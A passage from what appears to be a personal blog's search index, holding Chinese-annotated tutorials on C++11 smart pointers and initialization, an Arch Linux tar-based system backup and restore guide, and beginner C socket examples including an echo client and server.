version\tstd::cout &lt;&lt; &quot;vector old version:&quot; &lt;&lt; std::endl;\tfor(auto v : group) &#123;\t\tstd::cout &lt;&lt; v &lt;&lt; &quot; &quot;;\t&#125;\tstd::cout &lt;&lt; std::endl;\tstd::cout &lt;&lt; &quot;vector new version:&quot; &lt;&lt; std::endl;\tfor(auto &amp;v : group) &#123;\t\tv = 1;\t&#125;\tfor(const auto &amp;v : group) &#123;\t\tstd::cout &lt;&lt; v &lt;&lt; &quot; &quot;;\t&#125;&#125;class A &#123;\tpublic:\t\t//why explicit ?? 具体含义是什么?\t\texplicit A(int value) : m_value(value) &#123; &#125;\tprivate:\tint m_value;&#125;;static void newVersionConstruct() &#123;\tA a(10);\tA b&#123;3&#125;;\t//old\tint avector[] = &#123;1, 2, 3&#125;;\tstd::vector&lt;int&gt; bv;\tfor(auto v : avector) bv.push_back(v);\t\t//new \tstd::vector&lt;int&gt; cv = &#123;1, 2, 3&#125;;\tstd::vector&lt;int&gt; v &#123;1, 2, 3&#125;;\tA c(true);\tA d(false);\tA e(1.0);\t// A f&#123;1.0&#125; //不能做构造, 只能提高精度， 不能丢失&#125;class B &#123;\tpublic:\t\tB() : m_age(18), m_height(170), m_weight(75) &#123;&#125;\t\texplicit B(int age) : m_age(age), m_height(170), m_weight(75) &#123;&#125;\t\tB(int age, int height) : m_age(age), m_height(height) &#123;&#125;\t\tint age() const &#123; return m_age; &#125;\t\tint height() const &#123; return m_height; &#125;\t\tint weight() const &#123; return m_weight; &#125;\tprivate:\t\tint m_age;\t\tint m_height;\t\tint m_weight;&#125;;class NewB &#123;\tpublic:\t\tNewB() &#123;&#125;\t\texplicit NewB(int age) : m_age &#123;age&#125; &#123;&#125;\t\tNewB(int age, int height) : m_age&#123;age&#125;, m_height &#123;height&#125; &#123;&#125;\t\tint age() const &#123; return m_age; &#125;\t\tint height() const &#123; return m_height; &#125;\t\tint weight() const &#123; return m_weight; &#125;\t\tvoid p() const &#123; std::cout &lt;&lt; m_value &lt;&lt; &quot; &quot; &lt;&lt; m_fightValue;&#125;\tprivate:\t\tint m_age = 18; //初始化, 放置出现bug\t\tint m_height = 170;\t\tint m_weight = 75;\t\tint m_value&#123;&#125;; //代表拿int的默认值来作初始化,也就是0\t\tdouble m_fightValue&#123;&#125;; //0.0&#125;;static void defaultInitValue() &#123;\tB a(10, 20);\tNewB b(10, 20);\tstd::cout &lt;&lt; &quot;Old a age is&quot; &lt;&lt; a.age() &lt;&lt; &quot;height &quot; &lt;&lt; a.height()\t\t&lt;&lt; &quot; wight &quot; &lt;&lt; a.weight() &lt;&lt; std::endl;\tstd::cout &lt;&lt; &quot;New b age is&quot; &lt;&lt; b.age() &lt;&lt; &quot;height &quot; &lt;&lt; b.height()\t\t&lt;&lt; &quot; wight &quot; &lt;&lt; b.weight() &lt;&lt; std::endl;\tb.p();&#125;static void leftRefAndRightRef() &#123;\t//什么是引用\t//引用类似与指针,　不同之处在于, 指针可以为nullptr, 但引用不可以\tint a = 10;\tint &amp;refA = a;\tconst int &amp;constRefA = a;\tstd::cout &lt;&lt; &quot; a&quot; &lt;&lt; a &lt;&lt; &quot; ref of a &quot; &lt;&lt; refA &lt;&lt; &quot; const ref a &quot;\t\t&lt;&lt; constRefA &lt;&lt; std::endl;\t//this is a error\t// int &amp;refB = 10;\tconst int &amp;constRefB = 10; //不管左值还是右值,都能赋给const 引用\tstd::cout &lt;&lt; &quot;different version const ref &quot; &lt;&lt; constRefB &lt;&lt; std::endl;\t//auto &amp;&amp;rrB = 20; //与下一样\tint &amp;&amp;rrB = 20;\tconst int &amp;&amp;crrB = 20;\t\trrB = 30; //可以改变右值, 其实只是改变那个值而已\tstd::cout &lt;&lt; &quot; right ref of b &quot; &lt;&lt; rrB &lt;&lt; &quot; const right ref b &quot;\t\t&lt;&lt; crrB &lt;&lt; std::endl;\tint b = 20;\tint &amp;&amp;newRRB = std::move(b); //强行转为右值\tconst int &amp;&amp;cNewRRB = std::move(b);\tstd::cout &lt;&lt; &quot; b &quot; &lt;&lt; b &lt;&lt; &quot; right ref of be &quot; &lt;&lt; newRRB &lt;&lt; &quot;const right ref b &quot;\t\t&lt;&lt; cNewRRB &lt;&lt; std::endl;\tstd::cout &lt;&lt; &quot;address &quot; &lt;&lt; &amp;b &lt;&lt; &quot; ref &quot; &lt;&lt; &amp;newRRB &lt;&lt; &quot; c ref &quot; &lt;&lt; &amp;cNewRRB &lt;&lt; std::endl;&#125;\n\n\n\n\n\n\n\nC++11智能指针目前c++ 的4种指针\n\nauto_ptr  c++98 智能指针,使用了\n\nshared_ptr &#x2F;&#x2F;共享指针\n\nunique_ptr &#x2F;&#x2F;只能由一个使用者使用\n\nweaked_ptr &#x2F;&#x2F;与share_ptr搭配使用\n\n\nshared_patr实例代码\n#include &lt;iostream&gt;#include &lt;memory&gt;static void interfaceOfSharedPtr();int main(void) &#123;\tinterfaceOfSharedPtr();\treturn 0;&#125;class Object &#123;\tpublic:\t\tObject(int id) : m_id(id) &#123; std::cout &lt;&lt; &quot;init obj &quot; &lt;&lt; m_id &lt;&lt; std::endl; &#125;;\t\t~Object() &#123; std::cout &lt;&lt; &quot;bye bye &quot; &lt;&lt; m_id &lt;&lt; std::endl; &#125;\t\tint id() const &#123; return m_id; &#125;\tprivate:\t\tint m_id = 0;&#125;;//使用智能指针using ObjectPtr = std::shared_ptr&lt;Object&gt;;//作为参数的obj,相当于拷贝了一次,use_count 会+ 1,但当函数结束时候,智能指针析构,use_count会恢复原来的个数void print(ObjectPtr obj) &#123;\t//-------------------------智能指针的成员函数\tstd::cout &lt;&lt; &quot;count &quot; &lt;&lt; obj.use_count() &lt;&lt; &quot; id &quot; &lt;&lt; obj-&gt;id() &lt;&lt; std::endl;&#125;//以引用方式,不会进行copy, use_count不变void printRef(const ObjectPtr &amp;obj) &#123;\tstd::cout &lt;&lt; &quot;ref count &quot; &lt;&lt; obj.use_count() &lt;&lt; &quot;id &quot; &lt;&lt; obj-&gt;id() &lt;&lt; std::endl;&#125;static void interfaceOfSharedPtr() &#123;\tObjectPtr null;\tstd::cout &lt;&lt; &quot;ref count is &quot; &lt;&lt; null.use_count() &lt;&lt; std::endl;\t//使用智能指针来储存对象的指针\tObjectPtr obj (new Object(1));\t\tstd::cout &lt;&lt; &quot;ref count is &quot; &lt;&lt; obj.use_count() &lt;&lt; std::endl;\tObjectPtr obj2(obj);\tstd::cout &lt;&lt; &quot;ref count is &quot; &lt;&lt; obj2.use_count() &lt;&lt; std::endl;\tObjectPtr obj3 = obj;\tstd::cout &lt;&lt; &quot;ref count is &quot; &lt;&lt; obj.use_count() &lt;&lt; std::endl;\tobj2.reset(); //What dose means of reset ?\tstd::cout &lt;&lt; &quot;ref count is &quot; &lt;&lt; obj.use_count() &lt;&lt; std::endl;\tObjectPtr obj4;\tobj3.swap(obj4); //把obj3的管理资源相互交换\tstd::cout &lt;&lt; &quot;obj4 ref count is &quot; &lt;&lt; obj4.use_count() &lt;&lt; std::endl;\tstd::swap(obj3, obj4); //采用另一种方式交换 \tstd::cout &lt;&lt; &quot;obj4 ref count is &quot; &lt;&lt; obj4.use_count() &lt;&lt; std::endl;\t//把智能指针存储的指针传出来\tauto p = obj.get();\tif(p) &#123;\t\tstd::cout &lt;&lt; &quot;id is&quot; &lt;&lt; p-&gt;id() &lt;&lt; std::endl;\t\t&#125;\tif(obj) &#123; //重载了 operator bool\t\tstd::cout &lt;&lt; &quot;p id is &quot; &lt;&lt; obj-&gt;id() &lt;&lt; std::endl; //重载: operator -&gt;\t\tstd::cout &lt;&lt; &quot;ref id is &quot; &lt;&lt; (*obj).id() &lt;&lt; std::endl; //重载了: operator *\t&#125;\t\tobj4 = nullptr;\t//-----------------------------&gt;obj.use_count() == 1 可能效率比较底一点\tstd::cout &lt;&lt; &quot;only one hold ptr &quot; &lt;&lt; obj.unique() &lt;&lt; std::endl; //判断是否是一个人在使用\tstd::cout &lt;&lt; &quot;judge differnt: &quot; &lt;&lt; std::endl;\tstd::cout &lt;&lt; &quot;use_count: &quot; &lt;&lt; obj.use_count() &lt;&lt; std::endl;\tprintRef(obj);\tprint(obj);\tstd::cout &lt;&lt; &quot;use_count: &quot; &lt;&lt; obj.use_count() &lt;&lt; std::endl;&#125;void deleterOfObject(Object *obj) &#123;\tif(obj)\t\tstd::cout &lt;&lt; &quot;delete obj &quot; &lt;&lt; obj-&gt;id()  &lt;&lt; std::endl;\tdelete obj;&#125;void useDeleter() &#123;\t//当智能指针出了作用域后,析构函数就被调用, 哪怕中途抛出异常\tObjectPtr obj(new Object(2), deleterOfObject);\tObjectPtr obj2 = obj;&#125;\n\n\n\nweak_ptrc++智能指针-shared_ptr的尴尬-诞生weak_ptr\n#include &lt;iostream&gt;#include &lt;memory&gt;#include &lt;cassert&gt;//auto ptr//shared_ptr//unique_ptr//weak_ptrclass Parent; //采用前置声明using ParentPtr = std::shared_ptr&lt;Parent&gt;;typedef std::weak_ptr&lt;Parent&gt; WeakParentPtr;class Child &#123;\tpublic://\t\tParentPtr father; //内存泄露\t\tWeakParentPtr father; //采用弱指针,则可以释放内存,不造成内存泄露\t\tChild() &#123; std::cout &lt;&lt; &quot;Child!!&quot; &lt;&lt; std::endl; &#125;\t\t~Child();&#125;;typedef std::shared_ptr&lt;Child&gt; ChildPtr;typedef std::weak_ptr&lt;Child&gt; WeakChildPtr;class Parent &#123;\tpublic:\t\tParent() &#123; std::cout &lt;&lt; &quot;Parent!!&quot; &lt;&lt; std::endl; &#125;\t\tChildPtr son;//\t\tWeakChildPtr son;\t\tvoid print() const &#123; std::cout &lt;&lt; &quot;use_count: &quot; &lt;&lt; this-&gt;son.use_count() &lt;&lt; std::endl;&#125;\t\t~Parent();&#125;;class Object &#123;\tpublic:\t\tObject(int id) : m_id(id) &#123; std::cout &lt;&lt; &quot;init obj &quot; &lt;&lt; m_id &lt;&lt; std::endl; &#125;;\t\t~Object() &#123; std::cout &lt;&lt; &quot;bye bye &quot; &lt;&lt; m_id &lt;&lt; std::endl; &#125;\t\tint id() const &#123; return m_id; &#125;\tprivate:\t\tint m_id = 0;&#125;;using ObjectPtr = std::shared_ptr&lt;Object&gt;;Child::~Child() &#123; std::cout &lt;&lt; &quot;bye child!&quot; &lt;&lt; std::endl; &#125;Parent::~Parent() &#123; std::cout &lt;&lt; &quot;bye parent!&quot; &lt;&lt; std::endl; &#125;//----------------------------------------------void testParentAndChild() &#123;\tParentPtr p(new Parent());\tChildPtr c(new Child());//采用这种方式,造成内存泄露\tp-&gt;son = c; //智能指针拷贝, use_count + 1, c 的use_count 为 2\tp-&gt;print();\tc-&gt;father = p; //p 的 use_count 也为 2 了//智能指针析构之后use_count  -1//智能指针特性: 只有当use_count 变为0 时,才能释放掉管理的资源//所以智能指针析构后,use_count 不为0,则造成了内存泄露\t//////////////只要打破环状的引用,则share_ptr就会很好的管理内存&#125;//----------------------------------------------//为了解决以上问题, 采用weak_ptr来解决void sharedPtrWithWeakPtr() &#123;\tObjectPtr obj(new Object(1));\ttypedef std::weak_ptr&lt;Object&gt; WeakObjectPtr;\tWeakObjectPtr weakObj(obj);//弱指针依赖于share_ptr,若share_ptr是有效的,则wake_ptr也是有效的.\tWeakObjectPtr weakObj2(obj);\t//而wake_ptr在进行赋值的操作运算的时候,并不影响use_count, 相当于只是作为监听者\t\tstd::cout &lt;&lt; &quot;obj use count is &quot; &lt;&lt; obj.use_count() &lt;&lt; std::endl;\t&#123;\t\tauto p = weakObj.lock(); //相当于返回了一个 ObjectPtr类型,\t\tstd::cout &lt;&lt; &quot;expired: &quot; &lt;&lt; weakObj.expired() &lt;&lt; std::endl; //expierd() 查看监控的资源过期没有过期\t\tif(p) &#123;\t\t\tstd::cout &lt;&lt; p.unique() &lt;&lt; std::endl; //false, use_count &gt;= 2, 因为auto p = ...,进行了一次指针拷贝, \t\t\t//所以use_count + 1, 而weakObj.lock()返回若是有效的话,则use_count &gt;= 1, 否则返回nullptr\t\t\t//则总体的就use_count &gt;= 2\t\t\t//do what you wanna do\t\t\t&#125;else &#123;\t\t\t\t\t\t&#125;\t&#125;\tobj.reset(); //obj 放弃管理的资源\tstd::cout &lt;&lt; &quot;endl;&quot;;\tauto p2 = weakObj.lock(); //返回空,因为,obj不管理资源了\t\tobj.reset(new Object(2)); //重新管理另一个资源\t&#123;\t\tauto p = weakObj.lock();\t\tif(p) &#123;\t\t\tassert(false);\t\t&#125;else &#123;\t\t\t//要么资源已经释放,要么obj管理的资源跟换了.\t\t\tstd::cout &lt;&lt; &quot;changed!&quot; &lt;&lt; std::endl;\t\t&#125;\t&#125;\tstd::cout &lt;&lt; &quot;expired: &quot; &lt;&lt; weakObj.expired() &lt;&lt; std::endl; //expierd() 查看监控的资源过期没有过期&#125;int main(void) &#123;\ttestParentAndChild();//\tsharedPtrWithWeakPtr();\treturn 0;&#125;\n\n\n\nshared_ptr储存this指针多次析构问题enable_shared_from_this解决方案#include &lt;iostream&gt;#include &lt;memory&gt;#include &lt;cassert&gt;/*\t\t//this //调用了两次析构函数,\t\tParentPtr p(this);\t\t//智能指针出了作用域后就delete this ,析构了\t\t//所以错了,为了解决这个问题,就需要自身的类继承于　std::enable_shared_from_this&lt;Type&gt;\t\t//将ParentPtr p(this) 换成, shared_from_this();  */class Parent;typedef std::shared_ptr&lt;Parent&gt; ParentPtr;typedef std::weak_ptr&lt;Parent&gt; WeakParentPtr;class Child : public std::enable_shared_from_this&lt;Child&gt; &#123;\tpublic:\t\tWeakParentPtr father;//\t\tParentPtr father;\t\t~Child();\t\tChild();\t\tvoid checkRelation();&#125;;typedef std::shared_ptr&lt;Child&gt; ChildPtr;typedef std::weak_ptr&lt;Child&gt; WeakChildPtr;class Parent : public std::enable_shared_from_this&lt;Parent&gt; &#123;\tpublic:\t\tWeakChildPtr son;//\t\tChildPtr son;\t\t~Parent();\t\tParent();\t\tvoid checkRelation();&#125;;void handleChildAndParentRef(const Parent &amp;p, const Child &amp;c) &#123;\tif(c.father.lock().get() == &amp;p &amp;&amp; p.son.lock().get() == &amp;c) &#123;\t\tstd::cout &lt;&lt; &quot;right relation&quot; &lt;&lt; std::endl;\t\t&#125;else &#123;\t\tstd::cout &lt;&lt; &quot;oop!!!!!!&quot; &lt;&lt; std::endl;\t&#125;&#125;void handleChildAndParent(const ParentPtr &amp;p, const ChildPtr &amp;c) &#123;\tassert(c);\tassert(p);\tif(c-&gt;father.lock() == p &amp;&amp; p-&gt;son.lock() == c) &#123;\t\tstd::cout &lt;&lt; &quot;right relation&quot; &lt;&lt; std::endl;\t\t&#125;else &#123;\t\tstd::cout &lt;&lt; &quot;oop!!!!!!&quot; &lt;&lt; std::endl;\t&#125;&#125;Child::Child() &#123; std::cout &lt;&lt; &quot;hello child&quot; &lt;&lt; std::endl; &#125;Child::~Child() &#123; std::cout &lt;&lt; &quot;bye child&quot; &lt;&lt; std::endl; &#125;Parent::Parent() &#123; std::cout &lt;&lt; &quot;hello parent&quot; &lt;&lt; std::endl; &#125;Parent::~Parent() &#123; std::cout &lt;&lt; &quot;bye parent&quot; &lt;&lt; std::endl; &#125;void Parent::checkRelation() &#123;\tauto ps = son.lock();\tif(ps) &#123;\t\t//this //调用了两次析构函数,//\t\tParentPtr p(this);\t\t//handleChildAndParent(p, ps);\t\t\t//智能指针出了作用域后就delete this ,析构了\t\t//所以错了,为了解决这个问题,就需要自身的类继承于　std::enable_shared_from_this&lt;Type&gt;\t\t//将ParentPtr p(this) 这种错误形式换成, shared_from_this()\t\thandleChildAndParent(shared_from_this(), ps);\t\t&#125;\t\tstd::cout &lt;&lt; &quot;after call checkRelation&quot; &lt;&lt; std::endl;&#125;void Child::checkRelation() &#123;\t&#125;void testParentAndChild() &#123;\t//若Parent 继承于 std::enable_shared_from_this&lt;Type&gt;\t//则 Parent pp; 这种静态的就不推荐\tParentPtr p(new Parent());\tChildPtr c(new Child());\tp-&gt;son = c;\tc-&gt;father = p;\tp-&gt;checkRelation();&#125;static void interfaceOfSharedPtr();static void sharedPtrWithWeakPtr();static void uniquePtr();int main(void) &#123;\ttestParentAndChild();\t\treturn 0 ;&#125;\n\n\n\nunique_ptr#include &lt;iostream&gt;#include &lt;memory&gt;#include &lt;cassert&gt;class Object;typedef std::unique_ptr&lt;Object&gt; UniqueObjectPtr;using ObjectPtr = std::shared_ptr&lt;Object&gt;;void print(const UniqueObjectPtr&amp; obj) &#123;&#125;class Object &#123;\tpublic:\t\tObject(int x) : m_id(x) &#123; std::cout &lt;&lt; &quot;Hello Obj&quot; &lt;&lt; std::endl; &#125;;\t\t~Object() &#123; std::cout &lt;&lt; &quot;Bye Obj&quot; &lt;&lt; std::endl; &#125;;\t\tint id() &#123; return m_id; &#125;\tprivate:\t\t\tint m_id = 0;&#125;;void transfer(UniqueObjectPtr obj) &#123;\tstd::cout &lt;&lt; obj-&gt;id() &lt;&lt; std::endl;&#125;void uniquePtr() &#123;\tUniqueObjectPtr obj &#123; new Object(1) &#125;;\tauto p = obj.get(); //operator bool\tif(p) &#123;\t\t//do some\t\t&#125;\t//better\tif(obj) &#123;\t\t\t\t\t&#125;\t\tstd::cout &lt;&lt; p-&gt;id() &lt;&lt; &quot; &quot; &lt;&lt; obj-&gt;id() &lt;&lt; &quot; &quot; &lt;&lt; (*obj).id() &lt;&lt; &quot; &quot; &lt;&lt; std::endl;\tprint(obj);\t\tp = obj.release(); //释放所管理的指针\tstd::cout &lt;&lt; &quot;release: unique_ptr&quot; &lt;&lt; std::endl;\tdelete p; //直接释放资源\tobj.reset(new Object(2)); //reset 就是将以前所管理的指针释放掉, 管理一个新的指针\t//UniqueObjectPtr (const UniqueObject&amp;) = delete //这种拷贝构造函数不存在\t//UniqueObjectPtr (const UniqueObject&amp;&amp;) = default //\ttransfer(std::move(obj)); //采用这种方式传入, 则自己的资源不在管理,而交给了这个参数\t//传入之后, obj 值为null\tassert(obj == nullptr);//\tstd::cout &lt;&lt; obj-&gt;id() &lt;&lt; std::endl;\tobj.reset(new Object(3));\tObjectPtr sharedObj(std::move(obj));\tassert(obj == nullptr);//boost库/*\tc++ 智能指针来源于boost库.\tshared_ptr\tweak_ptr\tenable_shared_from_this\tscoped_ptr //与unique_ptr　很类似, 但局限性比较多, 所以c++11没有采用\tunique_ptr */&#125;int main(void) &#123;\tuniquePtr();\treturn 0;&#125;\n\n\n\n\n\n智能指针总结#include &lt;iostream&gt;#include &lt;memory&gt;#include &lt;cassert&gt;void sharedPtrNotice();class Parent;typedef std::shared_ptr&lt;Parent&gt; ParentPtr;typedef std::weak_ptr&lt;Parent&gt; WeakParentPtr;class Child : public std::enable_shared_from_this&lt;Child&gt; &#123;\tpublic:\t\t\tWeakParentPtr father;\t\tChild();\t\t~Child();&#125;;class Object &#123;\tpublic: \t\tObject(int x) : m_value(x) &#123; &#125;\tprivate:\t\tint m_value = 0;&#125;;using ObjectPtr = std::shared_ptr&lt;Object&gt;;void sharedPtrNotice() &#123;\t//1 : 绝对不要自己手动的管理资源 \t//int* a = new int(10);\t//delete a;\t//int *b = malloc(sizeof(int));\t//if(b) free(b);\t//2 :一个裸的指针不要用两个shared_ptr管理, 对于unique_ptr也如此\t//auto pObj = new Object(1);\t\t//ObjectPtr obj(pObj);\t//ObjectPtr obj2(pObj);\t//用weak_ptr打破循环引用,parent 和 child\t//当需要在类的内部接口中, 如果需要将this 作为智能指针来使用的话,\t//需要用该类派生自std::enable_shared_from_this\t//\t//使用share_ptr作为函数的接口,如果有可能有const shared_ptr&amp; 的形式\t//多线程模式下使用shared_ptr需注意的事项(....)\t//shared_ptr weak_ptr 和裸指针相比, 会大很多, 并且效率上会有影响.\t//尤其是在多线程模式下\t//shared_ptr 和 weak_ptr彼此互存,智能指针,空间上消耗资源比较大,而且时间效率上也比较低\t//一般情况下 ObejectPtr obj(new Object(2)),　相当于进行了两次new的过程.对于时间和空间上比较消耗\t//官方发现了这个问题,做了如下改正,且实现的功能一样\t//只实现了一次new,将new Object() 和 new 自身的指针归在一起\tObjectPtr obj5 = std::make_shared&lt;Object&gt;(3); //真正推荐使用...\t//enable_shared_from_this 中shared_from_this()和构造析构函数一样\t//不能在构造或者析构中使用,否则会出错的.\t//某些情况下,会出现内存不会降问题.尤其是使用weak_ptr来处理循环引用问题\t//那是可能因为weak_ptr给勾住了,也要需要weak_ptr释放了,才能解决.\t//如果有可能,优先使用类的实例,其次万不得已 2 使用std::unique_ptr\t//万不得已 3 使用 std::shared_ptr\tObject obj6(4); //优先\tstd::unique_ptr&lt;Object&gt; puObj(new Object(1)); //其次\tstd::shared_ptr&lt;Object&gt; psObj = std::make_shared&lt;Object&gt;(3); //在其次&#125;int main(void) &#123;\t\treturn 0;&#125;\n\n","categories":["language"],"tags":["cpp"]},{"title":"Linux系统备份以及恢复","url":"/2020/02/15/env/linux/myarch/backup_and_recover/","content":"Arch Linux系统备份以及恢复Backup:$ sudo su# cd /# tar cpzf /arch_sys.tgz --exclude=/proc --exclude=/sys --exclude=/lost+found \\--exclude=/boot/efi --exclude=/run/media --exclude=/arch_sys.tgz /\n\n在档案文件名”backup.gz”和要备份的目录名”&#x2F;“之间给出了备份时必须排除在外的目录,有些目录是无用的,例如”&#x2F;proc”,”&#x2F;lost+ found”,”&#x2F;sys”,当然,”backup.gz”这个档案文件本身必须排除在外,否则你可能会得到一些超出常理的结果.如果不把”&#x2F;mnt”排 除在外,那么挂载在”&#x2F;mnt”上的其它分区也会被备份.另外需要确认一下”&#x2F;media”上没有挂载任何东西\n例如光盘,移动硬盘,如果有挂载东西.必须把 &#x2F;media也排除在外\n在备份命令结束时你可能会看到这样一个提示:”tar: Error exit delayed from previous errors”多数情况下可以忽略它.\n下面是我常用的&#x2F;backup脚本，根据情况自行调整\n#!/bin/bashdate_str=`date &quot;+%Y_%m_%d&quot;`name=arch_sys_$&#123;date_str&#125;.tgzecho Backup to $&#123;name&#125;sudo rm $&#123;name&#125;sudo tar -cvpzf $&#123;name&#125; \\    --exclude=/proc \\    --exclude=/sys \\    --exclude=/lost+found \\    --exclude=/boot/efi \\    --exclude=/run/media \\    --exclude=$&#123;name&#125; \\    /echo &quot;Backup finished!&quot;\n\n\n\n\n\nRecovery:cd /tar xpfz backup.tgz -C /\n创建目录:mkdir procmkdir lost+foundmkdir mntmkdir sysmkdir -p /run/media/logan/disk1mkdir -p /run/media/logan/disk2\n\n\n\n\n\n","categories":["env"],"tags":["linux"]},{"title":"c网络编程","url":"/2020/02/10/dev/language/c/network/","content":"C Network programing字节序验证当前电脑是大端还是小端。\n#include &lt;stdio.h&gt;void byteorder() &#123;\tunion &#123;\t\tshort value;\t\tchar union_bytes[sizeof(short)];\t&#125; test;\ttest.value = 0x0102;\tif((1 == test.union_bytes[0]) &amp;&amp; (2 == test.union_bytes[1])) &#123;\t\tprintf(&quot;big endian\\n&quot;);\t&#125;else if((2 == test.union_bytes[0]) &amp;&amp; (1 == test.union_bytes[1])) &#123;\t\tprintf(&quot;little endian\\n&quot;);\t&#125;else &#123;\t\tprintf(&quot;unknown\\n&quot;);\t&#125;&#125;int main(void) &#123;\tbyteorder();\treturn 0;&#125;\n\n\n\n测试listen函数server.c\n#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#include &lt;assert.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;static bool stop = false;static void handle_term(int sig) &#123;\tstop = true;&#125;int main(int argc, char **argv) &#123;\tsignal(SIGTERM, handle_term);\tif(argc &lt;= 3) &#123;\t\tprintf(&quot;Usage: %s ip_address port_number backlog\\n&quot;, basename(argv[0]));\t\treturn 1;\t&#125;\tconst char *ip = argv[1];\tint port = atoi(argv[2]);\tint backlog = atoi(argv[3]);\tint sock = socket(PF_INET, SOCK_STREAM, 0);\tassert(sock &gt;= 0);\tstruct sockaddr_in address;\tbzero(&amp;address, sizeof(address)); //清空为0\taddress.sin_family = AF_INET;\t//inet_pton是一个IP地址转换函数,\t//可以在将IP地址在“点分十进制”和“二进制整数”之间转换\t//而且inet_pton和inet_ntop这2个函数能够处理ipv4和ipv6\t\tinet_pton(AF_INET, ip,  &amp;address.sin_addr);\taddress.sin_port = htons(port); //转化为网络字节序\t//绑定\tint ret = bind(sock, (struct sockaddr *)&amp;address, sizeof(address));\tassert(-1 != ret);\tret = listen(sock, backlog);\tassert(-1 != ret);\t//通过系统发送信号来终止程序\twhile(!stop) &#123;\t\tsleep(1);\t&#125;\tclose(sock);\tprintf(&quot;End program\\n&quot;);\treturn 0;&#125;\n\n\n\n获取客户端基本信息#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;assert.h&gt;#include &lt;errno.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char **argv) &#123;\tif(argc &lt;= 2) &#123;\t\tprintf(&quot;Usage: %s [ip] [port]\\n&quot;, basename(argv[0]));\t\treturn 1;\t&#125;\tconst char *ip = argv[1];\tint port = atoi(argv[2]);\tstruct sockaddr_in address;\tbzero(&amp;address, sizeof(address));\taddress.sin_family = AF_INET;\tinet_pton(AF_INET, ip, &amp;address.sin_addr);\taddress.sin_port = htons(port);\tint sock = socket(PF_INET, SOCK_STREAM, 0);\tassert(sock &gt;= 0);\tint ret = bind(sock, (struct sockaddr *)&amp;address, sizeof(address));\tif(-1 == ret) &#123;\t\tperror(&quot;bind&quot;);\t\treturn 1;\t&#125;\tret = listen(sock, 5);\tassert(ret != -1);\tstruct sockaddr_in client_addr;\tsocklen_t client_addr_len = sizeof(client_addr);\tint c_fd = accept(sock, (struct sockaddr*)&amp;client_addr, &amp;client_addr_len);\tif(c_fd == -1) &#123;\t\tperror(&quot;accept::&quot;);\t&#125;else &#123;\t\tchar remote[INET_ADDRSTRLEN];\t\tprintf(&quot;connected with ip: %s and port %d\\n&quot;,\t\tinet_ntop(AF_INET, &amp;client_addr.sin_addr, remote, INET_ADDRSTRLEN),\t\tntohs(client_addr.sin_port));\t\tclose(c_fd);\t&#125;\treturn 0;&#125;\n\n\n\nEcho Server例子客户端client.cpp\n#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;cstdlib&gt;#include &lt;string&gt;#include &lt;unistd.h&gt;#include &lt;sys/socket.h&gt;#include &lt;netinet/in.h&gt;#include &lt;arpa/inet.h&gt;using namespace std;#define SERVER_PORT 6666#define SERVER_IP &quot;127.0.0.1&quot;int main(int argc, char **argv) &#123;\tint sockfd;\tint n;\tstruct sockaddr_in serveraddr;\tchar str[256] = &quot;Hello You guys\\n&quot;;\tif(argc &lt; 2) &#123;\t\tcout &lt;&lt; &quot;Usage: ./clinet [message]&quot; &lt;&lt; endl;\t\t\tfputs(&quot;Input error! \\n&quot;, stderr);\t\texit(1);\t&#125;\tsockfd = socket(AF_INET, SOCK_STREAM, 0);\tmemset(&amp;serveraddr, 0, sizeof(struct sockaddr_in));\tserveraddr.sin_family = AF_INET;\tinet_pton(AF_INET, SERVER_IP, &amp;serveraddr.sin_addr);\tserveraddr.sin_port = htons(SERVER_PORT); //转化为网络字节顺序\t\tconnect(sockfd, (struct sockaddr *)&amp;serveraddr, sizeof(serveraddr));\twrite(sockfd, argv[1], strlen(argv[1]));\tn = read(sockfd, str, sizeof(str) - 1);\tif(n &gt; 0) &#123;\t\tstr[n] = &#x27;\\0&#x27;;\t\tcout &lt;&lt; str;\t&#125;else &#123;\t\tperror(&quot;error&quot;);\t&#125;\t\tcout &lt;&lt; endl &lt;&lt; &quot;finished&quot; &lt;&lt; endl;\tclose(sockfd);\treturn 0;&#125;\n\n服务端#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;#include &lt;sys/socket.h&gt;#include &lt;string.h&gt;#include &lt;ctype.h&gt;#include &lt;arpa/inet.h&gt;#define SERVER_PORT 6666int main(void) &#123;\tint sock;  //信箱\t//AF_INET表示使用网络地址, SOCK_STREAM表示使用TCP协议\tsock = socket(AF_INET, SOCK_STREAM, 0);\tstruct sockaddr_in server_addr; //这个结构体,头文件中已经声明\t//清空标签\tbzero(&amp;server_addr, sizeof(server_addr));\t//设置协议家族为网络协议\t\t//htonl = host to net ,选择协议族为ipv4,\tserver_addr.sin_family = AF_INET;\t//监听本地所有地址\tserver_addr.sin_addr.s_addr = htonl(INADDR_ANY);\tserver_addr.sin_port = htons(SERVER_PORT); //绑定端口号\t//实现标签贴到信箱上\tbind(sock, (struct sockaddr *)&amp;server_addr, sizeof(server_addr));\tlisten(sock, 128); //同时的连接数量,同时来的信件接受多少封,这里为128\t\t//万事俱备,只等来信.\tprintf(&quot;等待客户连接...\\n&quot;);\twhile(1) &#123;\t\tstruct sockaddr_in client;\t\tint client_sock ; //客户端\t\tchar client_ip[64];\t\tchar buf[256];\t\tint buf_len;\t\tsocklen_t client_addr_len = sizeof(client);\t\t client_sock = accept(sock, (struct sockaddr *)&amp;client, &amp;client_addr_len);\t\t//打印客户端地址和端口号\t\t\t//转化网络字节序\t\tprintf(&quot;client ip: %s\\n port: %d\\n&quot;, \t\tinet_ntop(AF_INET, &amp;client.sin_addr.s_addr, client_ip, sizeof(client_ip)),\t\tntohs(client.sin_port));\t\t\t\t//读取数据\t\tbuf_len = read(client_sock, buf, sizeof(buf) - 1);\t\tbuf[buf_len] = &#x27;\\x00&#x27;;\t\tprintf(&quot;接受到消息: %s\\n&quot;, buf);\t\tfor(int i = 0; i &lt; buf_len; i++) &#123;\t\t\t\tbuf[i] = toupper(buf[i]);\t\t&#125;\t\t\twrite(client_sock, buf, 